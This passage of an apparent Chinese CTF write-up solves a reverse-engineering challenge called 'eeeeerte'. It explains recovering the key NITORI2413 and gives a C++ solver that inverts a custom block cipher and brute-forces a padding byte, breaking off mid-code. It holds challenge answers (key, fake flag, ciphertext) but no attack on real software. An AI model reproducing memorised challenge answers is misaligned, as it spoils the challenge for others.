{</span><br><span class="line">    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%c"</span>, tmp[i]);</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h2 id="eeeeerte"><a href="#eeeeerte" class="headerlink" title="eeeeerte"></a>eeeeerte</h2><p>易语言，逆起来很恶心，用IDA插件恢复了部分函数名，图片点击根据总次数共有三种响应，一种是正常的加密逻辑，输入是key，不过加密的是假flag。第二种是弹窗输出真flag加密后的结果。第三个是画图。</p><p>因为key和flag都没有，猜测第三个画出来的是key，但是我在linux下用wine跑弹不出画板，不知道会不会真的弹出来图，所以用python按照给出的左上角和右下角的坐标画了一个，得到key是<code>NITORI2413</code>，然后按照加密的过程一点点逆就可以了。</p><p>不过结果是47位，不能被8整除，最后一位填充什么未知，懒得逆所以直接爆破。</p><figure class="highlight cpp hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> R[<span class="hljs-number">256</span>] = {</span><br><span class="line">    <span class="hljs-number">0xA3</span>, <span class="hljs-number">0xD7</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0xF8</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0xF6</span>, <span class="hljs-number">0xF4</span>, <span class="hljs-number">0xB3</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x15</span>, <span class="hljs-number">0x78</span>,</span><br><span class="line">    <span class="hljs-number">0x99</span>, <span class="hljs-number">0xB1</span>, <span class="hljs-number">0xAF</span>, <span class="hljs-number">0xF9</span>, <span class="hljs-number">0xE7</span>, <span class="hljs-number">0x2D</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0x8A</span>, <span class="hljs-number">0xCE</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0xCA</span>, <span class="hljs-number">0x2E</span>,</span><br><span class="line">    <span class="hljs-number">0x52</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0xD9</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0xDF</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0xA0</span>,</span><br><span class="line">    <span class="hljs-number">0x17</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0xB7</span>, <span class="hljs-number">0x7A</span>, <span class="hljs-number">0xC3</span>, <span class="hljs-number">0xE9</span>, <span class="hljs-number">0xFA</span>, <span class="hljs-number">0x3D</span>, <span class="hljs-number">0x53</span>,</span><br><span class="line">    <span class="hljs-number">0x96</span>, <span class="hljs-number">0x84</span>, <span class="hljs-number">0x6B</span>, <span class="hljs-number">0xBA</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x9A</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0x7C</span>, <span class="hljs-number">0xAE</span>, <span class="hljs-number">0xE5</span>, <span class="hljs-number">0xF5</span>,</span><br><span class="line">    <span class="hljs-number">0xF7</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0x6A</span>, <span class="hljs-number">0xA2</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0xB6</span>, <span class="hljs-number">0x7B</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0x1B</span>,</span><br><span class="line">    <span class="hljs-number">0xEE</span>, <span class="hljs-number">0xB4</span>, <span class="hljs-number">0x1A</span>, <span class="hljs-number">0xEA</span>, <span class="hljs-number">0xD0</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0xB8</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0xB9</span>, <span class="hljs-number">0xDA</span>, <span class="hljs-number">0x85</span>,</span><br><span class="line">    <span class="hljs-number">0x3F</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0xBF</span>, <span class="hljs-number">0xE0</span>, <span class="hljs-number">0x5A</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0xD8</span>, <span class="hljs-number">0x90</span>,</span><br><span class="line">    <span class="hljs-number">0x35</span>, <span class="hljs-number">0xD5</span>, <span class="hljs-number">0xC0</span>, <span class="hljs-number">0xA7</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x94</span>, <span class="hljs-number">0x56</span>,</span><br><span class="line">    <span class="hljs-number">0x6D</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0x9B</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0x97</span>, <span class="hljs-number">0xFC</span>, <span class="hljs-number">0xB2</span>, <span class="hljs-number">0xC2</span>, <span class="hljs-number">0xB0</span>, <span class="hljs-number">0xFE</span>, <span class="hljs-number">0xDB</span>, <span class="hljs-number">0x20</span>,</span><br><span class="line">    <span class="hljs-number">0xE1</span>, <span class="hljs-number">0xEB</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0xDD</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x4A</span>, <span class="hljs-number">0x1D</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0xED</span>, <span class="hljs-number">0x9E</span>, <span class="hljs-number">0x6E</span>,</span><br><span class="line">    <span class="hljs-number">0x49</span>, <span class="hljs-number">0x3C</span>, <span class="hljs-number">0xCD</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0xD2</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0xD4</span>, <span class="hljs-number">0xDE</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x18</span>,</span><br><span class="line">    <span class="hljs-number">0x89</span>, <span class="hljs-number">0xCB</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x1F</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0xC6</span>, <span class="hljs-number">0x8F</span>, <span class="hljs-number">0xAA</span>, <span class="hljs-number">0xC8</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0xDC</span>, <span class="hljs-number">0xC9</span>,</span><br><span class="line">    <span class="hljs-number">0x5D</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xA4</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x2C</span>, <span class="hljs-number">0x9F</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x2B</span>, <span class="hljs-number">0x87</span>,</span><br><span class="line">    <span class="hljs-number">0x50</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0x7D</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x4B</span>, <span class="hljs-number">0x1C</span>, <span class="hljs-number">0x73</span>,</span><br><span class="line">    <span class="hljs-number">0xD1</span>, <span class="hljs-number">0xC4</span>, <span class="hljs-number">0xFD</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0xCC</span>, <span class="hljs-number">0xFB</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0xAB</span>, <span class="hljs-number">0xE6</span>, <span class="hljs-number">0x3E</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0xA5</span>,</span><br><span class="line">    <span class="hljs-number">0xAD</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0x9C</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0xF0</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0x7E</span>,</span><br><span class="line">    <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x8C</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0xE2</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0xEF</span>, <span class="hljs-number">0xBC</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0xA1</span>,</span><br><span class="line">    <span class="hljs-number">0xEC</span>, <span class="hljs-number">0xD3</span>, <span class="hljs-number">0x8E</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x86</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0xE8</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0xBE</span>,</span><br><span class="line">    <span class="hljs-number">0x92</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0xC5</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x9D</span>, <span class="hljs-number">0xCF</span>, <span class="hljs-number">0xF3</span>, <span class="hljs-number">0xA6</span>, <span class="hljs-number">0xBB</span>, <span class="hljs-number">0xAC</span>,</span><br><span class="line">    <span class="hljs-number">0x5E</span>, <span class="hljs-number">0x6C</span>, <span class="hljs-number">0xA9</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0xB5</span>, <span class="hljs-number">0xE3</span>, <span class="hljs-number">0xBD</span>, <span class="hljs-number">0xA8</span>, <span class="hljs-number">0x3A</span>, <span class="hljs-number">0x01</span>,</span><br><span class="line">    <span class="hljs-number">0x05</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0x46</span>,</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">char</span> key[] = <span class="hljs-string">"NITORI2413"</span>;</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">enc</span><span class="hljs-params">(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> *buffer)</span> </span>{</span><br><span class="line">  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">32</span>; i++) {</span><br><span class="line">    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">8</span>; j++) {</span><br><span class="line">      <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%02x "</span>, buffer[j]);</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"\n"</span>);</span><br><span class="line">    <span class="hljs-keyword">if</span> ((i / <span class="hljs-number">8</span>) % <span class="hljs-number">2</span> == <span class="hljs-number">0</span>) {</span><br><span class="line">      <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> a0 = buffer[<span class="hljs-number">0</span>];</span><br><span class="line">      <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> a1 = buffer[<span class="hljs-number">1</span>];</span><br><span class="line">      a0 ^= R[a1 ^ key[(<span class="hljs-number">4</span> * i) % <span class="hljs-number">10</span>]];</span><br><span class="line">      a1 ^= R[a0 ^ key[(<span class="hljs-number">4</span> * i + <span class="hljs-number">1</span>) % <span class="hljs-number">10</span>]];</span><br><span class="line">      a0 ^= R[a1 ^ key[(<span class="hljs-number">4</span> * i + <span class="hljs-number">2</span>) % <span class="hljs-number">10</span>]];</span><br><span class="line">      a1 ^= R[a0 ^ key[(<span class="hljs-number">4</span> * i + <span class="hljs-number">3</span>) % <span class="hljs-number">10</span>]];</span><br><span class="line">      <span class="hljs-comment">//   auto tmp = (unsigned short *)buffer;</span></span><br><span class="line">      <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">short</span> tmp[<span class="hljs-number">4</span>];</span><br><span class="line">      <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">4</span>; j++)</span><br><span class="line">        tmp[j] = (buffer[<span class="hljs-number">2</span> * j] &lt;&lt; <span class="hljs-number">8</span>) | buffer[<span class="hljs-number">2</span> * j + <span class="hljs-number">1</span>];</span><br><span class="line">      tmp[<span class="hljs-number">0</span>] = tmp[<span class="hljs-number">3</span>] ^ (i + <span class="hljs-number">1</span>);</span><br><span class="line">      tmp[<span class="hljs-number">3</span>] = tmp[<span class="hljs-number">2</span>];</span><br><span class="line">      tmp[<span class="hljs-number">2</span>] = tmp[<span class="hljs-number">1</span>];</span><br><span class="line">      tmp[<span class="hljs-number">1</span>] = (a0 &lt;&lt; <span class="hljs-number">8</span>) | a1;</span><br><span class="line">      tmp[<span class="hljs-number">0</span>] ^= tmp[<span class="hljs-number">1</span>];</span><br><span class="line">      <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">4</span>; j++) {</span><br><span class="line">        buffer[<span class="hljs-number">2</span> * j] = (tmp[j] &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xff</span>;</span><br><span class="line">        buffer[<span class="hljs-number">2</span> * j + <span class="hljs-number">1</span>] = (tmp[j]) &amp; <span class="hljs-number">0xff</span>;</span><br><span class="line">      }</span><br><span class="line">    } <span class="hljs-keyword">else</span> {</span><br><span class="line">      <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">short</span> tmp[<span class="hljs-number">4</span>];</span><br><span class="line">      <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">4</span>; j++)</span><br><span class="line">        tmp[j] = (buffer[<span class="hljs-number">2</span> * j] &lt;&lt; <span class="hljs-number">8</span>) | buffer[<span class="hljs-number">2</span> * j + <span class="hljs-number">1</span>];</span><br><span class="line">      <span class="hljs-keyword">auto</span> s_tmp = tmp[<span class="hljs-number">0</span>];</span><br><span class="line">      tmp[<span class="hljs-number">0</span>] = tmp[<span class="hljs-number">3</span>];</span><br><span class="line">      tmp[<span class="hljs-number">3</span>] = tmp[<span class="hljs-number">2</span>];</span><br><span class="line">      tmp[<span class="hljs-number">2</span>] = (tmp[<span class="hljs-number">1</span>] ^ s_tmp) ^ (i + <span class="hljs-number">1</span>);</span><br><span class="line">      <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> a0 = buffer[<span class="hljs-number">0</span>];</span><br><span class="line">      <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> a1 = buffer[<span class="hljs-number">1</span>];</span><br><span class="line">      a0 ^= R[a1 ^ key[(<span class="hljs-number">4</span> * i) % <span class="hljs-number">10</span>]];</span><br><span class="line">      a1 ^= R[a0 ^ key[(<span class="hljs-number">4</span> * i + <span class="hljs-number">1</span>) % <span class="hljs-number">10</span>]];</span><br><span class="line">      a0 ^= R[a1 ^ key[(<span class="hljs-number">4</span> * i + <span class="hljs-number">2</span>) % <span class="hljs-number">10</span>]];</span><br><span class="line">      a1 ^= R[a0 ^ key[(<span class="hljs-number">4</span> * i + <span class="hljs-number">3</span>) % <span class="hljs-number">10</span>]];</span><br><span class="line">      tmp[<span class="hljs-number">1</span>] = (a0 &lt;&lt; <span class="hljs-number">8</span>) | a1;</span><br><span class="line"></span><br><span class="line">      <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">4</span>; j++) {</span><br><span class="line">        buffer[<span class="hljs-number">2</span> * j] = (tmp[j] &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xff</span>;</span><br><span class="line">        buffer[<span class="hljs-number">2</span> * j + <span class="hljs-number">1</span>] = (tmp[j]) &amp; <span class="hljs-number">0xff</span>;</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">dec</span><span class="hljs-params">(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> *buffer)</span> </span>{</span><br><span class="line">  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">31</span>; i &gt;= <span class="hljs-number">0</span>; i--) {</span><br><span class="line">    <span class="hljs-keyword">if</span> ((i / <span class="hljs-number">8</span>) % <span class="hljs-number">2</span> == <span class="hljs-number">0</span>) {</span><br><span class="line">      <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">short</span> tmp[<span class="hljs-number">4</span>];</span><br><span class="line">      <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">4</span>; j++)</span><br><span class="line">        tmp[j] = (buffer[<span class="hljs-number">2</span> * j] &lt;&lt; <span class="hljs-number">8</span>) | buffer[<span class="hljs-number">2</span> * j + <span class="hljs-number">1</span>];</span><br><span class="line">      tmp[<span class="hljs-number">0</span>] ^= tmp[<span class="hljs-number">1</span>];</span><br><span class="line">      <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> a0 = (tmp[<span class="hljs-number">1</span>] &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xff</span>;</span><br><span class="line">      <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> a1 = (tmp[<span class="hljs-number">1</span>]) &amp; <span class="hljs-number">0xff</span>;</span><br><span class="line">      tmp[<span class="hljs-number">1</span>] = tmp[<span class="hljs-number">2</span>];</span><br><span class="line">      tmp[<span class="hljs-number">2</span>] = tmp[<span class="hljs-number">3</span>];</span><br><span class="line">      tmp[<span class="hljs-number">3</span>] = tmp[<span class="hljs-number">0</span>] ^ (i + <span class="hljs-number">1</span>);</span><br><span class="line">      <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">4</span>; j++) {</span><br><span class="line">        buffer[<span class="hljs-number">2</span> * j] = (tmp[j] &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xff</span>;</span><br><span class="line">        buffer[<span class="hljs-number">2</span> * j + <span class="hljs-number">1</span>] = (tmp[j]) &amp; <span class="hljs-number">0xff</span>;</span><br><span class="line">      }</span><br><span class="line">      a1 ^= R[a0 ^ key[(<span class="hljs-number">4</span> * i + <span class="hljs-number">3</span>) % <span class="hljs-number">10</span>]];</span><br><span class="line">      a0 ^= R[a1 ^ key[(<span class="hljs-number">4</span> * i + <span class="hljs-number">2</span>) % <span class="hljs-number">10</span>]];</span><br><span class="line">      a1 ^= R[a0 ^ key[(<span class="hljs-number">4</span> * i + <span class="hljs-number">1</span>) % <span class="hljs-number">10</span>]];</span><br><span class="line">      a0 ^= R[a1 ^ key[(<span class="hljs-number">4</span> * i) % <span class="hljs-number">10</span>]];</span><br><span class="line">      buffer[<span class="hljs-number">0</span>] = a0;</span><br><span class="line">      buffer[<span class="hljs-number">1</span>] = a1;</span><br><span class="line">    } <span class="hljs-keyword">else</span> {</span><br><span class="line">      <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">short</span> tmp[<span class="hljs-number">4</span>];</span><br><span class="line">      <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">4</span>; j++)</span><br><span class="line">        tmp[j] = (buffer[<span class="hljs-number">2</span> * j] &lt;&lt; <span class="hljs-number">8</span>) | buffer[<span class="hljs-number">2</span> * j + <span class="hljs-number">1</span>];</span><br><span class="line">      <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> a0 = (tmp[<span class="hljs-number">1</span>] &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xff</span>;</span><br><span class="line">      <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> a1 = (tmp[<span class="hljs-number">1</span>]) &amp; <span class="hljs-number">0xff</span>;</span><br><span class="line">      a1 ^= R[a0 ^ key[(<span class="hljs-number">4</span> * i + <span class="hljs-number">3</span>) % <span class="hljs-number">10</span>]];</span><br><span class="line">      a0 ^= R[a1 ^ key[(<span class="hljs-number">4</span> * i + <span class="hljs-number">2</span>) % <span class="hljs-number">10</span>]];</span><br><span class="line">      a1 ^= R[a0 ^ key[(<span class="hljs-number">4</span> * i + <span class="hljs-number">1</span>) % <span class="hljs-number">10</span>]];</span><br><span class="line">      a0 ^= R[a1 ^ key[(<span class="hljs-number">4</span> * i) % <span class="hljs-number">10</span>]];</span><br><span class="line">      buffer[<span class="hljs-number">0</span>] = a0;</span><br><span class="line">      buffer[<span class="hljs-number">1</span>] = a1;</span><br><span class="line">      <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">short</span> s_tmp = (a0 &lt;&lt; <span class="hljs-number">8</span>) | a1;</span><br><span class="line">      tmp[<span class="hljs-number">1</span>] = (tmp[<span class="hljs-number">2</span>] ^ (i + <span class="hljs-number">1</span>)) ^ s_tmp;</span><br><span class="line">      tmp[<span class="hljs-number">2</span>] = tmp[<span class="hljs-number">3</span>];</span><br><span class="line">      tmp[<span class="hljs-number">3</span>] = tmp[<span class="hljs-number">0</span>];</span><br><span class="line">      <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">1</span>; j &lt; <span class="hljs-number">4</span>; j++) {</span><br><span class="line">        buffer[<span class="hljs-number">2</span> * j] = (tmp[j] &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xff</span>;</span><br><span class="line">        buffer[<span class="hljs-number">2</span> * j + <span class="hljs-number">1</span>] = (tmp[j]) &amp; <span class="hljs-number">0xff</span>;</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{</span><br><span class="line">  <span class="hljs-comment">//   unsigned char plain[] = "flag{Misdirection?MysteriousJack?FAAAKE}";</span></span><br><span class="line">  <span class="hljs-comment">//   for (int i = 0; i &lt; 40; i += 8)</span></span><br><span class="line">  <span class="hljs-comment">//     enc(&amp;plain[i]);</span></span><br><span class="line">  <span class="hljs-comment">//   for (int i = 0; i &lt; 40; i++) {</span></span><br><span class="line">  <span class="hljs-comment">//     printf("%02x ", plain[i]);</span></span><br><span class="line">  <span class="hljs-comment">//   }</span></span><br><span class="line">  <span class="hljs-comment">//   printf("\n");</span></span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> c = <span class="hljs-number">0</span>; c &lt;= <span class="hljs-number">0xff</span>; c++) {</span><br><span class="line">    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> cipher[<span class="hljs-number">49</span>] = {</span><br><span class="line">        <span class="hljs-number">0xc6</span>, <span class="hljs-number">0x6c</span>, <span class="hljs-number">0x4e</span>, <span class="hljs-number">0xf7</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0xa7</span>, <span class="hljs-number">0xf1</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0xdf</span>, <span class="hljs-number">0xa1</span>,</span><br><span class="line">        <span class="hljs-number">0x6a</span>, <span class="hljs-number">0x9a</span>, <span class="hljs-number">0x15</span>, <span class="hljs-number">0x2e</span>, <span class="hljs-number">0xa9</span>, <span class="hljs-number">0xa0</span>, <span class="hljs-number">0xb7</span>, <span class="hljs-number">0xfa</span>, <span class="hljs-number">0x9f</span>, <span class="hljs-number">0x5a</span>,</span><br><span class="line">        <span class="hljs-number">0xbb</span>, <span class="hljs-number">0x6d</span>, <span class="hljs-number">0x6a</span>, <span class="hljs-number">0xc8</span>, <span class="hljs-number">0xc9</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0xcb</span>, <span class="hljs-number">0x1</span>,  <span class="hljs-number">0xd7</span>, <span class="hljs-number">0x12</span>,</span><br><span class="line">        <span class="hljs-number">0x8f</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0x7e</span>, <span class="hljs-number">0xcf</span>, <span class="hljs-number">0xe3</span>, <span class="hljs-number">0x1</span>,  <span class="hljs-number">0x57</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x95</span>,</span><br><span class="line">        <span class="hljs-number">0xe1</span>, <span class="hljs-number">0x6b</span>, <span class="hljs-number">0x4c</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x5a</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>};</span><br><span class="line">    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">40</span>; i += <span class="hljs-number">8</span>)</span><br><span class="line">      <span class="hljs-built_in">dec</span>(&amp;cipher[i]);</span><br><span class="line">    cipher[<span 